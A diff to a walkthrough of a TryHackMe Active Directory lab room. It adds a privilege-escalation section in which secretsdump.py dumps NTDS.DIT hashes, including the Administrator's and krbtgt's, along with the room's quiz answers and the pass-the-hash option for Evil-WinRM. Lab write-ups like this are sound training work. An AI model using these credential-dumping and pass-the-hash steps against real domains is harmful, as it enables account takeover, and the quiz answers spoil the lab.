@@ -16,7 +16,9 @@ Room Link: https://tryhackme.com/r/room/attacktivedirectory
 1. NMap
 2. [kerbrute](https://github.com/ropnop/kerbrute/releases)
 3. Impacket
-4. smbclient
+4. hashcat
+5. smbclient
+6. Evil-WinRM
 
 ## Deploy The Machine
 1. Goto Access and get ovpn file to connect https://tryhackme.com/access Or, Start attackbox for testing.
@@ -154,6 +156,31 @@ smb: \>
 8. Question `What is the content of the file?` Answer `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`
 9. Question `Decoding the contents of the file, what is the full contents?` Answer `backup@spookysec.local:backup2517860`
 ## Elevating Privileges within the Domain
+1. We can dump password hashes, as backup account has that permission using `secretsdump.py -dc-ip spookysec.local backup:backup251786@spookysec.local` command.
+```bash
+secretsdump.py -dc-ip spookysec.local backup:backup2517860@spookysec.local
+Impacket v0.12.0.dev1+20240807.21946.829239e - Copyright 2023 Fortra
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
+spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
+spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
+spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
+.........
+..............
+```
+2. Question `What method allowed us to dump NTDS.DIT?` Answer `DRSUAPI`
+3. Question `What is the Administrators NTLM hash?` Answer `0e0363213e37b94221497260b0bcb4fc`
+4. Question `What method of attack could allow us to authenticate as the user without the password?` Answer `Pass the hash`
+5. Question `Using a tool called Evil-WinRM what option will allow us to use a hash?` Answer `-H`
+
 
 ## Flag Submission Panel
 
